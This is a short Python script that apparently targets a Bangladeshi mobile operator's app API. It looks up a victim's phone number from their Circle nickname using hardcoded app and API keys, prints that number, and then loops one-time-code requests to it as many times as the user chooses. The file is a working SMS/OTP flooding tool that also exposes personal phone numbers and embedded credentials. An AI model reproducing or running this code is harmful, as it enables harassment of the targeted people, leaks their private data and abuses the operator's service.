import requests as sexy
import json,time
from requests.structures import CaseInsensitiveDict


def cpin():
    a=input("Enter Your Circle id:- ")
    Am=int(input("Enter Amount:- "))


    heda = CaseInsensitiveDict()
    heda["Accept"] = "application/json"
    heda["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
    heda["x-api-key"] = "4e0ab65dcc9f79778e1d583a2aade21a"
    heda["Content-Type"] = "application/x-www-form-urlencoded"


    R=sexy.post(f"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getUserInfobyNickname&nickname={a}",headers=heda)
    data= (R.text)
#print(data)
    tree= json.loads(data)
    n= tree['data']['msisdn']
    print(n)

    hedar = CaseInsensitiveDict()
    hedar["Accept"] = "application/json"
    hedar["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
#hedar["x-api-key"] = "4e0ab65dcc9f79778e1d583a2aade21a"
    hedar["Content-Type"] = "application/x-www-form-urlencoded"

    for i in range(Am):
        A=sexy.post(f"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&msisdn={n}&pin=20201&app_version=80", headers=hedar)
        time.sleep(1.5)

        print("[",i+1,"]",A.text)
        


cpin()













